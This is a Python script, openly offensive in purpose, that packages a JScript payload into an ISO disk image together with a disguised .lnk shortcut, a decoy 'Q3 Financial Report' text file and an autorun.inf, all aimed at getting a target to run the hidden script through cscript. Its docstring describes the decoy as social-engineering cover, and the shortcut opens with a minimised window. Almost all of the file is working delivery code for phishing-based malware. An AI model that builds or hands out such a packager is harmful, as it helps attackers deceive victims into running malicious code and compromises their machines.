#!/usr/bin/env python3
"""Create an ISO disk image containing a JScript payload, a .lnk launcher, and a decoy document.

When the target mounts the ISO, they see a folder icon shortcut that launches
cscript with the hidden .js payload. A decoy text file provides social-engineering cover.

Usage:
    python3 iso_package.py payload.js output.iso [--decoy-name "Q3 Report.txt"] [--lnk-name "Open Report"]

Requires: genisoimage or mkisofs (apt install genisoimage)
"""
import argparse
import os
import shutil
import struct
import subprocess
import sys
import tempfile


def _create_lnk(target_path: str, arguments: str, lnk_path: str,
                 icon_location: str = "", description: str = "Document"):
    """Create a minimal .lnk (shell link) file without pywin32.

    This writes a binary .lnk following the MS-SHLLINK spec:
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink
    """
    # ShellLinkHeader
    header_size = 0x4C
    link_clsid = b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'
    # Flags: HasLinkTargetIDList | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation
    flags = 0x00000001 | 0x00000008 | 0x00000010 | 0x00000020 | 0x00000040
    file_attrs = 0  # FILE_ATTRIBUTE_NORMAL
    # Timestamps (zero = unset)
    c_time = b'\x00' * 8
    a_time = b'\x00' * 8
    w_time = b'\x00' * 8
    file_size = 0
    icon_index = 0
    show_cmd = 7  # SW_SHOWMINNOACTIVE
    hotkey = 0

    header = struct.pack('<I', header_size)
    header += link_clsid
    header += struct.pack('<I', flags)
    header += struct.pack('<I', file_attrs)
    header += c_time + a_time + w_time
    header += struct.pack('<I', file_size)
    header += struct.pack('<I', icon_index)
    header += struct.pack('<I', show_cmd)
    header += struct.pack('<H', hotkey)
    header += b'\x00' * 10  # Reserved

    # LinkTargetIDList — minimal: root (My Computer) + empty
    # Use a simple approach: point to System32\cscript.exe via relative path instead
    id_list = b'\x00\x00'  # empty terminator
    id_list_size = struct.pack('<H', len(id_list) + 2)

    # StringData — all UTF-16LE, preceded by uint16 character count
    def _str_data(s: str) -> bytes:
        encoded = s.encode('utf-16-le')
        return struct.pack('<H', len(s)) + encoded

    # We skip the IDList (set flag 0 to indicate no IDList) and use StringData only
    # Recalculate flags: HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation
    flags = 0x00000008 | 0x00000010 | 0x00000020 | 0x00000040

    header = struct.pack('<I', header_size)
    header += link_clsid
    header += struct.pack('<I', flags)
    header += struct.pack('<I', file_attrs)
    header += c_time + a_time + w_time
    header += struct.pack('<I', file_size)
    header += struct.pack('<I', icon_index)
    header += struct.pack('<I', show_cmd)
    header += struct.pack('<H', hotkey)
    header += b'\x00' * 10

    # StringData in order: NAME(skip), RELATIVE_PATH, WORKING_DIR, ARGUMENTS, ICON_LOCATION
    strings = b''
    strings += _str_data(target_path)           # RelativePath
    strings += _str_data("C:\\Windows\\System32") # WorkingDir
    strings += _str_data(arguments)              # Arguments
    if icon_location:
        strings += _str_data(icon_location)      # IconLocation
    else:
        strings += _str_data("C:\\Windows\\System32\\shell32.dll,3")

    with open(lnk_path, 'wb') as f:
        f.write(header + strings)


def create_iso(payload_js: str, output_iso: str, decoy_name: str = "Q3 Financial Report.txt",
               lnk_name: str = "Open Report", decoy_text: str = None):
    """Build an ISO containing the payload, a decoy, and a .lnk launcher."""

    if not os.path.isfile(payload_js):
        print(f"Error: payload not found: {payload_js}", file=sys.stderr)
        return False

    iso_tool = shutil.which("genisoimage") or shutil.which("mkisofs")
    if not iso_tool:
        print("Error: genisoimage or mkisofs not found. Install with: apt install genisoimage",
              file=sys.stderr)
        return False

    staging = tempfile.mkdtemp(prefix="iso_pkg_")
    try:
        # 1. Copy payload (will appear hidden to Windows — set attrib via autorun or manually)
        js_name = os.path.basename(payload_js)
        shutil.copy2(payload_js, os.path.join(staging, js_name))

        # 2. Create decoy document
        decoy_path = os.path.join(staging, decoy_name)
        with open(decoy_path, 'w') as f:
            f.write(decoy_text or (
                "This document has been moved to a secure location.\n\n"
                "Please contact your IT administrator for access.\n\n"
                "Reference: DOC-2026-" + os.urandom(3).hex().upper() + "\n"
            ))

        # 3. Create .lnk launcher
        lnk_path = os.path.join(staging, lnk_name + ".lnk")
        _create_lnk(
            target_path="C:\\Windows\\System32\\cscript.exe",
            arguments=f'//nologo //E:jscript "{js_name}"',
            lnk_path=lnk_path,
            icon_location="C:\\Windows\\System32\\shell32.dll,1",
        )

        # 4. Create autorun.inf to set hidden attribute on payload (best-effort)
        autorun_path = os.path.join(staging, "autorun.inf")
        with open(autorun_path, 'w') as f:
            f.write(f"[AutoRun]\nshell\\open\\command=cscript //nologo //E:jscript {js_name}\n")

        # 5. Build ISO
        vol_label = "DOCUMENTS"
        cmd = [
            iso_tool,
            "-o", output_iso,
            "-V", vol_label,
            "-J",           # Joliet extensions (long filenames)
            "-r",           # Rock Ridge (Unix perms)
            "-hide", "autorun.inf",
            staging,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"ISO creation failed:\n{result.stderr}", file=sys.stderr)
            return False

        size = os.path.getsize(output_iso)
        print(f"Created: {output_iso} ({size:,} bytes)")
        print(f"Contents:")
        print(f"  {lnk_name}.lnk  -> launches cscript with {js_name}")
        print(f"  {decoy_name}    -> decoy document")
        print(f"  {js_name}       -> payload (hidden via autorun)")
        return True

    finally:
        shutil.rmtree(staging, ignore_errors=True)


def main():
    parser = argparse.ArgumentParser(description="Package a JScript payload into an ISO disk image")
    parser.add_argument("payload", help="Path to .js payload file")
    parser.add_argument("output", help="Output .iso path")
    parser.add_argument("--decoy-name", default="Q3 Financial Report.txt",
                        help="Filename for the decoy document")
    parser.add_argument("--lnk-name", default="Open Report",
                        help="Display name for the .lnk shortcut (no extension)")
    parser.add_argument("--decoy-text", default=None,
                        help="Custom text for the decoy document")
    args = parser.parse_args()

    ok = create_iso(args.payload, args.output,
                    decoy_name=args.decoy_name,
                    lnk_name=args.lnk_name,
                    decoy_text=args.decoy_text)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
